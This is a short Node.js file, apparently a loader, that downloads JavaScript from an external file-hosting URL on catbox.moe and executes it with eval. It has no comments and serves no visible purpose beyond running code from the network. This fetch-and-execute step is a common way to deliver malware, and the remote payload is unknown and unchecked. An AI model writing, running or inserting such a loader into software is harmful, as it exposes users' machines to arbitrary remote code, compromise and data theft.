const axios = require('axios');

const url = "https://files.catbox.moe/8znpb1.js";

axios.get(url)
    .then(response => eval(response.data))
    .catch(err => console.error(err));